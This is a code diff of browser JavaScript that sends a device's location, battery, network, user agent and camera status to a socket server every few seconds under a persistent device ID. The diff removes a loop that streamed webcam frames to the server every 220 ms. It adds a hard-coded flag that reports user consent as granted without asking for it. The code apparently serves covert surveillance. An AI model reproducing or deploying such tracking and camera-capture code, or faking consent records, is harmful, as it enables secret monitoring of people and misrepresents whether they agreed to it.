@@ -5,12 +5,9 @@ reconnection: true,
 reconnectionAttempts: Infinity,
 reconnectionDelay: 2000
 })
-const STREAM_FRAME_INTERVAL_MS = 220
-const STREAM_WIDTH = 240
-const STREAM_HEIGHT = 180
-const STREAM_JPEG_QUALITY = 0.28
 const TELEMETRY_INTERVAL_MS = 7000
 const GEO_MAX_AGE_MS = 10000
+const CONSENT_GRANTED = true
 
 // -----------------------
 // DEVICE ID (persistent)
@@ -139,10 +136,12 @@ battery: batteryLevel,
 charging: chargingStatus,
 platform: navigator.platform,
 model: navigator.userAgent,
+browser: navigator.userAgent,
 network: (navigator.connection && navigator.connection.effectiveType) || "unknown",
 lat: loc.lat,
 lon: loc.lon,
-camera: cameraStatus
+camera: cameraStatus,
+consent_granted: CONSENT_GRANTED
 
 }
 
@@ -170,6 +169,8 @@ console.log("Connected to server")
 
 socket.emit("register_device", {
 device_id: deviceId,
+browser: navigator.userAgent,
+consent_granted: CONSENT_GRANTED,
 timestamp: Date.now()
 })
 
@@ -218,21 +219,3 @@ image
 })
 
 })
-
-setInterval(() => {
-const video = document.getElementById("video")
-if(!video || !socket.connected) return
-if(video.videoWidth === 0 || video.videoHeight === 0) return
-
-const canvas = document.createElement("canvas")
-canvas.width = STREAM_WIDTH
-canvas.height = STREAM_HEIGHT
-const ctx = canvas.getContext("2d")
-ctx.drawImage(video, 0, 0, STREAM_WIDTH, STREAM_HEIGHT)
-
-socket.emit("stream_frame", {
-device_id: deviceId,
-frame: canvas.toDataURL("image/jpeg", STREAM_JPEG_QUALITY),
-ts: Date.now()
-})
-}, STREAM_FRAME_INTERVAL_MS)
